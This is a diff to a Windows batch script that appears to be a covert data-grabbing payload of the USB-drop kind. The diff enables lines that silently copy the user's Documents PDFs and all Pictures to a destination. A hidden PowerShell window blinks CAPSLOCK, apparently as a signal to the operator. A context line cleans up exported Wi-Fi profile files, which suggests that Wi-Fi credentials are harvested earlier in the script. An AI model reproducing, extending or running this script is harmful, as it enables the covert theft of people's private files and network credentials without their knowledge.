@@ -12,13 +12,13 @@ del %USERPROFILE%\wprofiles\Wi-Fi-*.xml
 rmdir %USERPROFILE%\wprofiles
 )
 
-REM if Exist %USERPROFILE%\Documents (
-REM xcopy /C /Q /G /Y /S %USERPROFILE%\Documents\*.* %dst% >>nul
-REM )
+if Exist %USERPROFILE%\Documents (
+xcopy /C /Q /G /Y /S %USERPROFILE%\Documents\*.pdf %dst% >>nul
+)
 
-REM if Exist %USERPROFILE%\Pictures (
-REM xcopy /C /Q /G /Y /S %USERPROFILE%\Pictures\*.* %dst% >>nul
-REM )
+if Exist %USERPROFILE%\Pictures (
+xcopy /C /Q /G /Y /S %USERPROFILE%\Pictures\*.* %dst% >>nul
+)
 
 REM Blink CAPSLOCK key
 start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"
